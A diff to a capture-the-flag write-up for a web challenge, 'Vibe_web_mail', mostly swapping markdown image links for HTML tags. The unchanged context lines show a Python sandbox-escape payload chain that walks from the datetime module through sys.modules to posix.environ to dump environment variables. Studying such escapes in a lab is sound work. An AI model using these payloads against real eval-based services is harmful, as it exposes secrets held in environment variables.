@@ -1,6 +1,6 @@
-**Challenge:** Vibe_web_mail
+**Challenge:** Vibe_web_mail  
 **Category:** Web — Server-Side Template Injection (SSTI) / Python Sandbox Escape  
-**Src:** [Vibe Web Mail — safe_eval.py](../Vibe_web_mail/)
+**Src:** [Vibe Web Mail](../Vibe_web_mail/)
 
 ## Overview
 
@@ -40,7 +40,7 @@ First, confirm expression evaluation works:
 **Payload:** `7*7`  
 **Result:** `49`
 
-![Step 1 - Basic evaluation test](images/image_1.png)
+<img src="images/image_1.png" alt="Step 1 - Basic evaluation test" width="600">
 
 ### Step 2: Builtin Module Access
 
@@ -49,7 +49,7 @@ Test access to permitted `datetime` module:
 **Payload:** `str(datetime)`  
 **Result:** `<module 'datetime' from '/usr/lib/python3.x/datetime.py'>`
 
-![Step 2 - DateTime module access](images/image_2.png)
+<img src="images/image_2.png" alt="Step 2 - DateTime module access" width="600">
 
 **Payload:** `str(datetime.datetime.now())`  
 **Result:** Current timestamp confirms method execution
@@ -61,7 +61,7 @@ Traverse from `datetime` to `sys.modules` to enumerate loaded modules:
 **Payload:** `list(datetime.sys.modules.keys())`  
 **Result:** List of all loaded Python modules
 
-![Step 3 - Enumerate loaded modules](images/image_3.png)
+<img src="images/image_3.png" alt="Step 3 - Enumerate loaded modules" width="600">
 
 ### Step 4: POSIX Module Access
 
@@ -70,7 +70,7 @@ Verify access to `posix` module (Unix system interface):
 **Payload:** `str(datetime.sys.modules.get("posix"))`  
 **Result:** `<module 'posix' (built-in)>`
 
-![Step 4 - POSIX module verification](images/image_4.png)
+<img src="images/image_4.png" alt="Step 4 - POSIX module verification" width="600">
 
 ### Step 5: Environment Variable Access
 
@@ -79,7 +79,7 @@ Access OS environment variables through `posix.environ`:
 **Payload:** `str(datetime.sys.modules.get("posix").environ)`  
 **Result:** Dictionary of environment variables
 
-![Step 5 - Environment variables access](images/image_5.png)
+<img src="images/image_5.png" alt="Step 5 - Environment variables access" width="600">
 
 ## Flag
 
